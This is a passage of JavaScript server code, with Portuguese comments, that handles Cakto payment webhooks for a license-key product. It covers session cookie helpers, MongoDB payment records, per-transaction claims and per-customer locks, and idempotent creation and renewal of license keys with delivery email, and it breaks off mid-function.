// Todo cookie de sessão autenticada passa por aqui —
// evita a inconsistência que existia antes (algumas limpezas de zv_portal
// sem Secure). Nomes de cookie continuam exatamente os mesmos
// (zv_portal/zv_admin/zv_an); só a criação/remoção foi centralizada.
function setSessionCookie(res, name, token, maxAgeSec) {
  const maxAge = maxAgeSec ? `; Max-Age=${maxAgeSec}` : '';
  res.setHeader('Set-Cookie', `${name}=${token}; Path=/; HttpOnly; SameSite=Strict; Secure${maxAge}`);
}
function clearSessionCookie(res, name) {
  res.setHeader('Set-Cookie', `${name}=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; HttpOnly; SameSite=Strict; Secure`);
}
function clearAnalyticsCookie(res) { clearSessionCookie(res, 'zv_an'); }

function caktoPaymentTxKey(txId) {
  const normalized = safeScalar(txId, 160);
  if (!normalized) return '';
  return `cpt_${crypto.createHash('sha256').update(`cakto\0${normalized}`, 'utf8').digest('hex')}`;
}

async function savePayment(payment, { strict = false } = {}) {
  try {
    const db = await getMongoDb();
    const doc = { ...payment, savedAt: new Date() };
    if (doc.approved === true && (doc.txNamespace === 'cakto' || doc.source === 'cakto') && doc.txId) {
      doc.txNamespace = 'cakto';
      doc.commercialTxKey = caktoPaymentTxKey(doc.txId);
    }
    return await db.collection('payments').insertOne(doc);
  } catch (e) {
    console.error('[DB] Erro ao salvar pagamento:', e.message);
    if (strict) throw e;
    return null;
  }
}

async function backfillCaktoPaymentTxKeys(db, opts = {}) {
  if (!db || typeof db.collection !== 'function') return { scanned: 0, updated: 0, conflicts: 0 };
  const coll = db.collection('payments');
  const limit = Math.max(1, Math.min(10000, Number(opts.limit) || 2000));
  const docs = await coll.find({ approved: true, txId: { $exists: true }, commercialTxKey: { $exists: false }, $or: [{ txNamespace: 'cakto' }, { source: 'cakto' }] }, { projection: { _id: 1, txId: 1 } }).limit(limit).toArray();
  let updated = 0, conflicts = 0;
  for (const doc of docs) {
    const commercialTxKey = caktoPaymentTxKey(doc.txId);
    if (!commercialTxKey) continue;
    try {
      const result = await coll.updateOne({ _id: doc._id, commercialTxKey: { $exists: false } }, { $set: { commercialTxKey, txNamespace: 'cakto' } });
      if (result?.matchedCount) updated++;
    } catch (e) {
      if (e?.code === 11000) conflicts++;
      else throw e;
    }
  }
  return { scanned: docs.length, updated, conflicts };
}

function commercialCustomerLockId(email) {
  const normalized = safeScalar(email, 160).toLowerCase();
  if (!normalized) return '';
  return `commercial:${crypto.createHash('sha256').update(normalized, 'utf8').digest('hex')}`;
}

function commercialTxNamespace(sale) {
  if (sale?.testMode) return 'simulacao';
  return safeScalar(sale?.source, 40).toLowerCase() === 'cakto' ? 'cakto' : 'blocked';
}

function commercialTxClaimId(sale) {
  const txId = safeScalar(sale?.txId, 160);
  if (!txId) return '';
  const ns = commercialTxNamespace(sale);
  return `commercial_tx:${crypto.createHash('sha256').update(`${ns}\0${txId}`, 'utf8').digest('hex')}`;
}

function commercialTxIdentityHash(sale, plan) {
  const email = safeScalar(sale?.clientEmail, 160).toLowerCase();
  if (!email || !plan) return '';
  const entitlement = `${Number(plan.maxUses) || 0}:${Number(plan.durationDays) || 0}`;
  return crypto.createHash('sha256').update(`${email}\0${entitlement}`, 'utf8').digest('hex');
}

function commercialTxClaimExpiry(now = new Date()) {
  const base = now instanceof Date ? new Date(now) : new Date();
  return new Date(base.getTime() + COMMERCIAL_TX_CLAIM_RETENTION_DAYS * 86400000);
}

function commercialOrderKeyForSale(sale, paidAtMs) {
  const ms = Number.isFinite(Number(paidAtMs)) ? Math.max(0, Math.trunc(Number(paidAtMs))) : 0;
  const txTie = caktoPaymentTxKey(sale?.txId || '').slice(-16) || '0000000000000000';
  return `${String(ms).padStart(16, '0')}:${txTie}`;
}

async function acquireCommercialTxClaim(db, sale, plan, owner = crypto.randomBytes(16).toString('hex'), opts = {}) {
  if (!db || typeof db.collection !== 'function') throw Object.assign(new Error('commercial_tx_db_unavailable'), { code: 'commercial_tx_db_unavailable' });
  const claimId = commercialTxClaimId(sale);
  const identityHash = commercialTxIdentityHash(sale, plan);
  if (!claimId) return { ok: false, error: 'commercial_tx_required' };
  if (!identityHash) return { ok: false, error: 'commercial_customer_invalid' };
  const leaseMs = Math.max(30000, Number(opts.leaseMs) || COMMERCIAL_TX_CLAIM_LEASE_MS);
  const waitMs = Math.max(0, Number(opts.waitMs) >= 0 ? Number(opts.waitMs) : COMMERCIAL_TX_CLAIM_WAIT_MS);
  const started = Date.now();
  const coll = db.collection('commercial_tx_claims');
  do {
    const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
    const leaseUntil = new Date(now.getTime() + leaseMs);
    const baseDoc = {
      _id: claimId, namespace: commercialTxNamespace(sale), identityHash,
      entitlement: { maxUses: Number(plan.maxUses) || 0, durationDays: Number(plan.durationDays) || 0 },
      state: 'processing', owner, fence: 1, leaseUntil, createdAt: now, updatedAt: now, expiresAt: commercialTxClaimExpiry(now),
    };
    try {
      await coll.insertOne(baseDoc);
      return { ok: true, claimId, owner, fence: 1, leaseUntil, identityHash, completed: false };
    } catch (e) {
      if (e?.code !== 11000) throw e;
    }
    const existing = await coll.findOne({ _id: claimId });
    if (!existing) continue;
    if (existing.identityHash !== identityHash || Number(existing.entitlement?.maxUses) !== Number(plan.maxUses) || Number(existing.entitlement?.durationDays) !== Number(plan.durationDays)) {
      return { ok: false, claimId, owner, error: 'commercial_tx_conflict' };
    }
    if (existing.state === 'completed') {
      return { ok: true, claimId, owner: null, fence: Number(existing.fence) || 0, identityHash, completed: true, duplicate: true };
    }
    const expired = !existing.leaseUntil || new Date(existing.leaseUntil).getTime() <= now.getTime();
    if (existing.owner === owner || expired || existing.state === 'retryable') {
      try {
        const result = await coll.findOneAndUpdate(
          { _id: claimId, identityHash, state: { $ne: 'completed' }, $or: [{ owner }, { leaseUntil: { $lte: now } }, { leaseUntil: { $exists: false } }, { state: 'retryable' }] },
          { $set: { state: 'processing', owner, leaseUntil, updatedAt: now, expiresAt: commercialTxClaimExpiry(now) }, $inc: { fence: 1 }, $unset: { lastError: '', failureCategory: '', failureRef: '', failedAt: '' } },
          { returnDocument: 'after' }
        );
        const doc = result && typeof result === 'object' && 'value' in result ? result.value : result;
        if (doc && doc.owner === owner && doc.state === 'processing' && Number.isInteger(Number(doc.fence))) return { ok: true, claimId, owner, fence: Number(doc.fence), leaseUntil: new Date(doc.leaseUntil), identityHash, completed: false, resumed: true };
      } catch (e) {
        if (e?.code !== 11000) throw e;
      }
    }
    if (Date.now() - started >= waitMs) break;
    await new Promise(resolve => setTimeout(resolve, Math.min(100, Math.max(10, waitMs))));
  } while (true);
  return { ok: false, claimId, owner, error: 'commercial_tx_busy' };
}

async function renewCommercialTxClaim(db, claim, opts = {}) {
  if (!db || !claim?.claimId || !claim?.owner || claim.completed) return !!claim?.completed;
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const leaseMs = Math.max(30000, Number(opts.leaseMs) || COMMERCIAL_TX_CLAIM_LEASE_MS);
  const leaseUntil = new Date(now.getTime() + leaseMs);
  const result = await db.collection('commercial_tx_claims').updateOne(
    { _id: claim.claimId, owner: claim.owner, fence: Number(claim.fence), state: 'processing' },
    { $set: { leaseUntil, updatedAt: now } }
  );
  if (result?.matchedCount) claim.leaseUntil = leaseUntil;
  return !!result?.matchedCount;
}

async function completeCommercialTxClaim(db, claim, opts = {}) {
  if (!db || !claim?.claimId) return false;
  if (claim.completed) return true;
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const result = await db.collection('commercial_tx_claims').updateOne(
    { _id: claim.claimId, owner: claim.owner, fence: Number(claim.fence), state: 'processing' },
    { $set: { state: 'completed', completedAt: now, updatedAt: now, expiresAt: commercialTxClaimExpiry(now) }, $unset: { owner: '', leaseUntil: '', lastError: '', failureCategory: '', failureRef: '', failedAt: '' } }
  );
  if (result?.matchedCount) claim.completed = true;
  return !!result?.matchedCount;
}

async function failCommercialTxClaim(db, claim, error, opts = {}) {
  if (!db || !claim?.claimId || !claim?.owner || claim.completed) return false;
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const result = await db.collection('commercial_tx_claims').updateOne(
    { _id: claim.claimId, owner: claim.owner, fence: Number(claim.fence), state: 'processing' },
    { $set: { state: 'retryable', failedAt: now, updatedAt: now, leaseUntil: new Date(0), expiresAt: commercialTxClaimExpiry(now), failureCategory: classifyCaktoQueueFailure(error), failureRef: caktoQueueFailureRef(error) }, $unset: { owner: '', lastError: '' } }
  );
  return !!result?.matchedCount;
}

async function findCommercialPaymentByTx(db, sale) {
  const txId = safeScalar(sale?.txId, 160);
  if (!txId || !db || typeof db.collection !== 'function') return null;
  if (commercialTxNamespace(sale) !== 'cakto') return null;
  const commercialTxKey = caktoPaymentTxKey(txId);
  const coll = db.collection('payments');
  const paymentQuery = { approved: true, $or: [{ commercialTxKey }, { txId, txNamespace: 'cakto' }, { txId, source: 'cakto' }] };
  let payments;
  if (typeof coll.find === 'function') {
    payments = await coll.find(
      paymentQuery,
      { projection: { _id: 1, commercialTxKey: 1, txId: 1, txNamespace: 1, source: 1, keyCode: 1, renewed: 1, maxUses: 1, paidAt: 1 } }
    ).limit(3).toArray();
  } else {
    const one = await coll.findOne(paymentQuery);
    payments = one ? [one] : [];
  }
  if (!payments.length) return null;
  const licenseCodes = new Set(payments.map(p => safeScalar(p.keyCode, 128)).filter(Boolean));
  if (licenseCodes.size > 1) {
    const error = new Error('commercial_payment_conflict');
    error.code = 'commercial_payment_conflict';
    throw error;
  }
  const payment = payments.find(p => p.commercialTxKey === commercialTxKey) || payments[0];
  for (const doc of payments) {
    if (!doc.commercialTxKey && doc._id !== undefined) {
      await coll.updateOne({ _id: doc._id, commercialTxKey: { $exists: false } }, { $set: { commercialTxKey, txNamespace: 'cakto' } }).catch(() => {});
    }
  }
  return payment;
}

async function commercialDuplicateResultFromPayment(payment, plan, deps = {}) {
  if (!payment?.keyCode) return null;
  const keyStore = deps.keyStore || keys;
  if (!keyStore[payment.keyCode] && !deps.keyStore) await ensureKeyLoaded(payment.keyCode);
  const existing = keyStore[payment.keyCode] || {};
  return {
    keyCode: payment.keyCode, renewed: !!payment.renewed, duplicate: true,
    expiresAt: existing.expiresAt || null,
    maxUses: existing.maxUses || payment.maxUses || plan.maxUses,
    emailDelivered: false,
  };
}

async function acquireCommercialCustomerLock(db, email, owner = crypto.randomBytes(16).toString('hex'), opts = {}) {
  if (!db || typeof db.collection !== 'function') throw new Error('commercial_lock_db_unavailable');
  const lockId = commercialCustomerLockId(email);
  if (!lockId) throw new Error('commercial_customer_invalid');
  const leaseMs = Math.max(30000, Number(opts.leaseMs) || COMMERCIAL_LOCK_LEASE_MS);
  const waitMs = Math.max(0, Number(opts.waitMs) >= 0 ? Number(opts.waitMs) : COMMERCIAL_LOCK_WAIT_MS);
  const started = Date.now();
  do {
    const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
    const leaseUntil = new Date(now.getTime() + leaseMs);
    const expiresAt = new Date(leaseUntil.getTime() + WORKER_LOCK_RETENTION_MS);
    try {
      const result = await db.collection('worker_locks').findOneAndUpdate(
        { _id: lockId, $or: [{ owner }, { leaseUntil: { $lte: now } }, { leaseUntil: { $exists: false } }] },
        { $set: { owner, leaseUntil, expiresAt, updatedAt: now, kind: 'commercial_customer' }, $setOnInsert: { createdAt: now }, $inc: { fence: 1 } },
        { upsert: true, returnDocument: 'after' }
      );
      const doc = result && typeof result === 'object' && 'value' in result ? result.value : result;
      if (doc && doc.owner === owner && Number.isInteger(Number(doc.fence)) && new Date(doc.leaseUntil).getTime() > now.getTime()) {
        return { ok: true, lockId, owner, fence: Number(doc.fence), leaseUntil: new Date(doc.leaseUntil), leaseMs };
      }
    } catch (e) {
      if (e?.code !== 11000) throw e;
    }
    if (Date.now() - started >= waitMs) break;
    await new Promise(resolve => setTimeout(resolve, Math.min(100, Math.max(10, waitMs))));
  } while (true);
  return { ok: false, lockId, owner, error: 'commercial_customer_busy' };
}

async function renewCommercialCustomerLock(db, lock, opts = {}) {
  if (!db || !lock?.lockId || !lock?.owner || !Number.isInteger(Number(lock?.fence))) return false;
  const now = opts.now instanceof Date ? new Date(opts.now) : new Date();
  const leaseMs = Math.max(30000, Number(opts.leaseMs) || lock.leaseMs || COMMERCIAL_LOCK_LEASE_MS);
  const leaseUntil = new Date(now.getTime() + leaseMs);
  const expiresAt = new Date(leaseUntil.getTime() + WORKER_LOCK_RETENTION_MS);
  const result = await db.collection('worker_locks').updateOne(
    { _id: lock.lockId, owner: lock.owner, fence: Number(lock.fence) },
    { $set: { leaseUntil, expiresAt, updatedAt: now } }
  );
  if (result?.matchedCount) lock.leaseUntil = leaseUntil;
  return !!result?.matchedCount;
}

async function releaseCommercialCustomerLock(db, lock) {
  if (!db || !lock?.lockId || !lock?.owner || !Number.isInteger(Number(lock?.fence))) return;
  const now = new Date();
  await db.collection('worker_locks').updateOne(
    { _id: lock.lockId, owner: lock.owner, fence: Number(lock.fence) },
    { $set: { leaseUntil: new Date(0), expiresAt: new Date(now.getTime() + WORKER_LOCK_RETENTION_MS), updatedAt: now } }
  ).catch(() => {});
}

async function withCommercialCustomerLock(db, email, fn, opts = {}) {
  const lock = await acquireCommercialCustomerLock(db, email, opts.owner, opts);
  if (!lock.ok) {
    const error = new Error(lock.error || 'commercial_customer_busy');
    error.code = lock.error || 'commercial_customer_busy';
    throw error;
  }
  let lost = false;
  const heartbeatMs = Math.max(5000, Number(opts.heartbeatMs) || COMMERCIAL_LOCK_HEARTBEAT_MS);
  const renewOrThrow = async () => {
    if (lost) throw Object.assign(new Error('commercial_customer_lock_lost'), { code: 'commercial_customer_lock_lost' });
    const ok = await renewCommercialCustomerLock(db, lock, { leaseMs: opts.leaseMs });
    if (!ok) {
      lost = true;
      throw Object.assign(new Error('commercial_customer_lock_lost'), { code: 'commercial_customer_lock_lost' });
    }
    return true;
  };
  const heartbeat = opts.disableHeartbeat === true ? null : setInterval(() => {
    renewCommercialCustomerLock(db, lock, { leaseMs: opts.leaseMs }).then(ok => { if (!ok) lost = true; }).catch(() => { lost = true; });
  }, heartbeatMs);
  heartbeat?.unref?.();
  try { return await fn(lock, renewOrThrow); }
  finally {
    if (heartbeat) clearInterval(heartbeat);
    await releaseCommercialCustomerLock(db, lock);
  }
}

async function _processCommercialSaleUnlocked(sale, plan, deps = {}) {
  if (!sale || !plan) throw new Error('commercial_sale_invalid');
  const clientEmail = safeScalar(sale.clientEmail, 160).toLowerCase();
  if (!clientEmail || !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(clientEmail)) throw new Error('commercial_customer_invalid');

  const keyStore = deps.keyStore || keys;
  const db = deps.db || await getMongoDb();
  const findPortalUser = deps.findPortalUser || (email => db.collection('portal_users').findOne({ _id: email }));
  const linkPortalUser = deps.linkPortalUser || ((email, keyCode) => db.collection('portal_users').updateOne({ _id: email }, { $set: { keyCode } }, { upsert: false }));
  const persistKey = deps.persistKey || (code => db.collection('store').updateOne(
    { _id: 'keys' },
    { $set: { [`data.${code}`]: keyStore[code], updatedAt: new Date() } },
    { upsert: true }
  ));
  const paymentSaver = deps.savePayment || (payment => savePayment(payment, { strict: true }));
  const deliveryMailer = deps.sendKeyDeliveryEmail || sendKeyDeliveryEmail;
  const now = deps.now instanceof Date ? new Date(deps.now) : new Date();
  const durationMs = plan.durationDays * 24 * 60 * 60 * 1000;

  const rawMarkerSource = sale.testMode ? 'simulacao' : safeScalar(sale.markerSource || sale.source, 32, 'cakto').toLowerCase().replace(/[^a-z0-9_-]/g, '');
  const txLabel = rawMarkerSource || 'cakto';
  const creationTxMarker = sale.txId ? `${txLabel}_tx:${sale.txId}` : null;
  const renewalTxMarker = sale.txId ? `renovado_${txLabel}_tx:${sale.txId}` : null;

  // Segunda camada de idempotência do pipeline Cakto.
  if (sale.txId && !sale.testMode && deps.skipPaymentIdempotency !== true) {
    const already = await findCommercialPaymentByTx(db, sale);
    const duplicateResult = await commercialDuplicateResultFromPayment(already, plan, { ...deps, keyStore });
    if (duplicateResult) return duplicateResult;
  }

  let existingCode = null;
  let targetSource = 'payer_email';
  let boundOwnerEmail = '';
  const claimToken = safeScalar(sale.checkoutBinding, 640);
  if (isZvmCheckoutBinding(claimToken)) {
    const resolved = await resolveSubscriptionCheckout({
      claim: claimToken, secret: APP_SECRET, nowMs: now.getTime(), purchase: sale,
      lookupPreviousPayment: async subscriptionId => {
        const prev = typeof deps.findPaymentBySubscription === 'function'
          ? await deps.findPaymentBySubscription(subscriptionId)
          : await db.collection('payments').findOne(
            { source: 'cakto', subscriptionId, approved: true, testMode: { $ne: true } },
            { sort: { paidAt: -1 }, projection: { txId: 1, keyCode: 1, subscriptionId: 1, source: 1, approved: 1, testMode: 1, paidAt: 1 } }
          );
        return prev;
      },
      lookupOwner: findPortalUser,
    });
    if (!resolved.ok) throw Object.assign(new Error('cakto_checkout_binding_invalid'), { code: 'cakto_checkout_binding_invalid', detailCode: resolved.reason });
    const binding = { keyCode: resolved.keyCode, ownerEmail: resolved.ownerEmail };
    const boundUser = await findPortalUser(binding.ownerEmail);
    if (!boundUser || boundUser.keyCode !== binding.keyCode) {
      throw Object.assign(new Error('cakto_checkout_binding_ownership_changed'), { code: 'cakto_checkout_binding_ownership_changed' });
    }
    if (!keyStore[binding.keyCode] && !deps.keyStore) await ensureKeyLoaded(binding.keyCode);
    if (!keyStore[binding.keyCode]) throw Object.assign(new Error('cakto_checkout_binding_key_missing'), { code: 'cakto_checkout_binding_key_missing' });
    existingCode = binding.keyCode;
    targetSource = resolved.reason === 'verified_subscription_renewal' ? 'subscription_history' : 'portal_checkout';
    boundOwnerEmail = binding.ownerEmail;
  }
  if (!existingCode && sale.subscriptionId && !sale.testMode) {
    const prev = typeof deps.findPaymentBySubscription === 'function'
      ? await deps.findPaymentBySubscription(sale.subscriptionId)
      : await db.collection('payments').findOne(
        { source: 'cakto', subscriptionId: sale.subscriptionId, approved: true, testMode: { $ne: true } },
        { sort: { paidAt: -1 }, projection: { keyCode: 1 } }
      );
    if (prev?.keyCode) {
      if (!keyStore[prev.keyCode] && !deps.keyStore) await ensureKeyLoaded(prev.keyCode);
      if (!keyStore[prev.keyCode]) throw Object.assign(new Error('cakto_subscription_target_missing'), { code: 'cakto_subscription_target_missing' });
      existingCode = prev.keyCode;
      targetSource = 'subscription_history';
    }
  }
  const portalUser = await findPortalUser(clientEmail);
  if (!existingCode && portalUser?.keyCode) {
    if (!keyStore[portalUser.keyCode] && !deps.keyStore) await ensureKeyLoaded(portalUser.keyCode);
    if (keyStore[portalUser.keyCode]) existingCode = portalUser.keyCode;
  }
  if (!existingCode) {
    existingCode = Object.keys(keyStore).find(code => {
      const noteEmail = (keyStore[code]?.note || '').match(/Email: (\S+)/)?.[1] || '';
      return noteEmail.toLowerCase() === clientEmail;
    }) || null;
  }
  if (!existingCode && sale.txId && !sale.testMode && db && typeof db.collection === 'function') {
    const stored = await db.collection('store').findOne({ _id: 'keys' }, { projection: { data: 1 } });
    const storedKeys = stored?.data && typeof stored.data === 'object' ? stored.data : {};
    const txMarkers = [creationTxMarker, renewalTxMarker].filter(Boolean);
    const recoveredCode = Object.keys(storedKeys).find(code => {
      const note = String(storedKeys[code]?.note || '');
      return txMarkers.some(marker => note.includes(marker));
    }) || null;
    if (recoveredCode) {
      keyStore[recoveredCode] = storedKeys[recoveredCode];
      existingCode = recoveredCode;
    }
  }

  // P0 — retomada de falha parcial não pode somar a duração duas vezes: se
  // persistKey/linkPortalUser/savePayment falhar DEPOIS que a chave já foi
  // mutada em memória (criada ou renovada), o evento vira "failed" e é
  // reprocessado do zero. Sem isto, o reprocessamento
  // encontraria a MESMA chave via existingCode e aplicaria +duração de novo
  // por cima do que a tentativa anterior já tinha aplicado — cliente
  // recebendo o dobro dos dias por uma única compra. As marcas de txId já
  // gravadas em key.note (criação: "cakto_tx:X"; renovação: "renovado_..._tx:X")
  // servem como prova de que ESTA transação específica já mutou esta chave.
  const preMutationCode = existingCode || null;
  const preMutationKey = preMutationCode && keyStore[preMutationCode]
    ? JSON.parse(JSON.stringify(keyStore[preMutationCode]))
    : null;
  const incomingPaidAtMs = Number.isFinite(new Date(sale.paidAt).getTime()) ? new Date(sale.paidAt).getTime() : now.getTime();
  const incomingOrderKey = commercialOrderKeyForSale(sale, incomingPaidAtMs);
  let keyCode;
  let renewed;
  if (existingCode) {
    keyCode = existingCode;
    const key = keyStore[keyCode];
    const alreadyRenewedThisTx = !!(renewalTxMarker && key.note && key.note.includes(renewalTxMarker));
    const alreadyCreatedThisTx = !alreadyRenewedThisTx && !!(creationTxMarker && key.note && key.note.includes(creationTxMarker));
    if (alreadyRenewedThisTx || alreadyCreatedThisTx) {
      renewed = alreadyRenewedThisTx;
    } else {
      renewed = true;
      const currentExpiry = key.expiresAt ? new Date(key.expiresAt) : null;
      const validExpiry = currentExpiry && Number.isFinite(currentExpiry.getTime()) && currentExpiry > now;
      const base = validExpiry ? currentExpiry : now;
      key.expiresAt = new Date(base.getTime() + durationMs).toISOString();
      key.expireDuration = durationMs;
      const currentPaidAtMs = Number.isFinite(new Date(key.commercialPaidAt).getTime()) ? new Date(key.commercialPaidAt).getTime() : -Infinity;
      const currentOrderKey = key.commercialOrderKey || (Number.isFinite(currentPaidAtMs) ? `${String(Math.max(0, Math.trunc(currentPaidAtMs))).padStart(16, '0')}:` : '');
      if (!currentOrderKey || incomingOrderKey >= currentOrderKey) {
        key.maxUses = plan.maxUses;
        key.planId = plan.id;
        key.commercialPaidAt = new Date(incomingPaidAtMs).toISOString();
        key.commercialOrderKey = incomingOrderKey;
      }
      key.active = true;
      key.warnEmailSent = false;
      key.note = [key.note || '', renewalTxMarker || `renovado_${txLabel}`].filter(Boolean).join('\n');
    }
  } else {
    keyCode = generateCode();
    renewed = false;
    const expiresAt = new Date(now.getTime() + durationMs).toISOString();
    keyStore[keyCode] = {
      label: `${sale.testMode ? '🧪 Simulação' : 'Venda Cakto'} - ${safeScalar(sale.clientName, 120, 'Cliente')}`,
      active: true, phones: [], activations: [], uses: 0,
      maxUses: plan.maxUses, planId: plan.id, commercialPaidAt: new Date(incomingPaidAtMs).toISOString(), commercialOrderKey: incomingOrderKey,
      expiresAt, expireDuration: durationMs,
      createdAt: now.toISOString(), lastUsed: null, lastIp: null,
      lastPhone: null, deviceId: null, wppVersion: null, warnCount: 0,
      tracking: sale.tracking || null,
      note: [sale.testMode ? 'Simulação (Analytics Lab)' : 'Pedido Cakto', `Email: ${clientEmail}`, creationTxMarker, sale.tracking?.compact ? `Origem: ${sale.tracking.compact}` : null].filter(Boolean).join('\n'),
    };
  }

  // P0 — ordem importa pra recuperação de falha parcial: savePayment é o
  // ÚLTIMO passo mutável antes do e-mail (tolerante a falha via try/catch
  // A persistência da licença e o vínculo do portal antecedem o payment final; assim, um payment existente prova que o entitlement já foi materializado.
  const assertCommercialAuthority = typeof deps.assertCommercialAuthority === 'function' ? deps.assertCommercialAuthority : async () => true;
  try {
    await assertCommercialAuthority('persist_key');
    await persistKey(keyCode);
  } catch (e) {
    if (preMutationKey && preMutationCode === keyCode) keyStore[keyCode] = preMutationKey;
    else if (!preMutationKey) delete keyStore[keyCode];
    invalidateKeysHtmlCache();
    throw e;
  }
  if (typeof deps.reportCommercialPhase === 'function') await deps.reportCommercialPhase('license_persisted', { keyCode });
  await assertCommercialAuthority('link_portal');
  // Um pagamento por terceiro não pode deslocar a licença vinculada à conta do pagador.
  const canLinkPayer = (!boundOwnerEmail || boundOwnerEmail === clientEmail)
    && (targetSource !== 'subscription_history' || !portalUser?.keyCode || portalUser.keyCode === keyCode);
  if (canLinkPayer) await linkPortalUser(clientEmail, keyCode);
  if (typeof deps.reportCommercialPhase === 'function') await deps.reportCommercialPhase('portal_linked', { keyCode });
  await assertCommercialAuthority('save_payment');
  await paymentSaver({
    source: sale.source || 'cakto', txNamespace: commercialTxNamespace(sale), ...(sale.testMode ? {} : { commercialTxKey: caktoPaymentTxKey(sale.txId) }), testMode: !!sale.testMode, txId: sale.txId, refId: sale.refId || '', subscriptionId: sale.subscriptionId || '',
    offerId: sale.offerId || '', productId: sale.productId || '',
    checkoutUrl: sale.checkoutUrl || '', status: 'approved', approved: true,
    clientName: sale.clientName, clientEmail, clientPhone: sale.clientPhone,
    productName: sale.productName || sale.offerName || plan.name,
    amount: sale.amount, paymentMethod: sale.paymentMethod,
    tracking: sale.tracking || null, keyCode, maxUses: plan.maxUses, renewed,
    paidAt: Number.isFinite(new Date(sale.paidAt).getTime()) ? new Date(sale.paidAt).toISOString() : now.toISOString(),
    rawStatus: sale.event,
  });
  if (typeof deps.reportCommercialPhase === 'function') await deps.reportCommercialPhase('payment_saved', { keyCode });
  if (typeof deps.onPaymentCommitted === 'function') await deps.onPaymentCommitted({ keyCode });

  // Delivery is durable for real Cakto sales. Payment/claim authority is already
  // sealed, then an encrypted outbox row is required before this transaction is
  // allowed to disappear from the webhook retry path. Test/simulation adapters
  // keep the old direct-mail behavior and never write to the real outbox.
  let emailDelivered = false;
  let mailRef = null;
  if (!sale.testMode && db && typeof db.collection === 'function' && caktoDurableMailEnabled()) {
    if (typeof deps.afterPaymentCommitted === 'function') await deps.afterPaymentCommitted({ keyCode, renewed });
    const outbox = await ensureCaktoDeliveryOutbox(db, sale, plan, { keyCode, renewed, expiresAt: keyStore[keyCode].expiresAt }, { ...deps, keyStore, now });
    mailRef = outbox.mailRef;
    if (deps.deferMail !== true) {
      const attempted = await attemptCaktoMailByRef(db, mailRef, { ...deps, sendKeyDeliveryEmail: deliveryMailer, now });
      emailDelivered = !!attempted.sent;
    }
  } else {
    try {
      const delivered = await deliveryMailer(clientEmail, {
        code: keyCode, planId: keyStore[keyCode].planId || plan.id, planLabel: plan.shortName, maxUses: keyStore[keyCode].maxUses,
        expiresAt: keyStore[keyCode].expiresAt, renewed, durationDays: plan.durationDays,
        baseUrl: BASE_URL, extensionUrl: EXTENSION_URL,
        ctaPath: safeLocalRedirect(sale.ctaPath, '/cliente'),
      });
      emailDelivered = !!delivered;
      if (!emailDelivered) console.warn('[CAKTO] Provedor recusou o e-mail de entrega para', maskEmail(clientEmail));
    } catch (e) { console.warn('[CAKTO] Falha ao enviar e-mail de entrega:', safeScalar(e?.message, 80, 'mail_failed')); }
  }

  invalidateKeysHtmlCache();
  return { keyCode, renewed, expiresAt: keyStore[keyCode].expiresAt, maxUses: plan.maxUses, emailDelivered, mailRef };
}

async function processCommercialSale(sale, plan, deps = {}) {
  if (!sale || !plan) throw new Error('commercial_sale_invalid');
  if (!sale.testMode && safeScalar(sale.source, 40).toLowerCase() !== 'cakto') throw Object.assign(new Error('commercial_source_not_allowed'), { code: 'commercial_source_not_allowed' });
  // Simulações são isoladas por adapters próprios e não escrevem no estado
  // comercial real. O bypass de testes antigo continua pulando AMBAS as
  // autoridades distribuídas para não alterar harnesses unitários legados.
  if (sale.testMode || deps.disableCommercialLock === true) return _processCommercialSaleUnlocked(sale, plan, deps);
  const email = safeScalar(sale.clientEmail, 160).toLowerCase();
  if (!email || !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) throw Object.assign(new Error('commercial_customer_invalid'), { code: 'commercial_customer_invalid' });
  const txId = safeScalar(sale.txId, 160);
  if (!txId && deps.allowMissingTxId !== true) throw Object.assign(new Error('commercial_tx_required'), { code: 'commercial_tx_required' });
  const db = deps.db || await getMongoDb();

  let txClaim = null;
  if (txId && deps.disableCommercialTxClaim !== true) {
    txClaim = await acquireCommercialTxClaim(db, sale, plan, deps.commercialTxOwner, {
      waitMs: deps.commercialTxWaitMs,
      leaseMs: deps.commercialTxLeaseMs,
      now: deps.commercialTxNow,
    });
    if (!txClaim.ok) throw Object.assign(new Error(txClaim.error || 'commercial_tx_busy'), { code: txClaim.error || 'commercial_tx_busy' });
    // Uma claim concluída é autoridade mais forte que qualquer input novo. Só
    // aceitamos repetir a resposta se o payment selado existir; nunca recriamos
    // uma licença a partir de um claim completed inconsistente.
    if (txClaim.completed) {
      const already = await findCommercialPaymentByTx(db, sale);
      const duplicateResult = await commercialDuplicateResultFromPayment(already, plan, deps);
      if (duplicateResult) return duplicateResult;
      throw Object.assign(new Error('commercial_tx_inconsistent'), { code: 'commercial_tx_inconsistent' });
    }
  }

  const reportCommercialPhase = txClaim ? async (phase, info = {}) => {
    const now = new Date();
    const set = { phase: safeScalar(phase, 40), updatedAt: now };
    if (info.keyCode) set.licenseRef = maskLicenseCode(info.keyCode);
    const result = await db.collection('commercial_tx_claims').updateOne(
      { _id: txClaim.claimId, owner: txClaim.owner, fence: Number(txClaim.fence), state: 'processing' }, { $set: set }
    );
    if (!result?.matchedCount) throw Object.assign(new Error('commercial_tx_claim_lost'), { code: 'commercial_tx_claim_lost' });
  } : null;

  try {
    const runUnlocked = async (assertCustomerLock) => {
      const assertCommercialAuthority = async () => {
        if (txClaim) {
          const txOk = await renewCommercialTxClaim(db, txClaim, { leaseMs: deps.commercialTxLeaseMs });
          if (!txOk) throw Object.assign(new Error('commercial_tx_claim_lost'), { code: 'commercial_tx_claim_lost' });
        }
        if (assertCustomerLock) await assertCustomerLock();
        return true;
      };
      const onPaymentCommitted = txClaim ? async () => {
        await assertCommercialAuthority();
        if (!txClaim.completed) {
          const completed = await completeCommercialTxClaim(db, txClaim);
          if (!completed) throw Object.assign(new Error('commercial_tx_claim_lost'), { code: 'commercial_tx_claim_lost' });
        }
      } : null;
      const result = await _processCommercialSaleUnlocked(sale, plan, { ...deps, db, assertCommercialAuthority, reportCommercialPhase, onPaymentCommitted });
      if (!txClaim?.completed) {
        await assertCommercialAuthority();
        if (txClaim) {
          const completed = await completeCommercialTxClaim(db, txClaim);
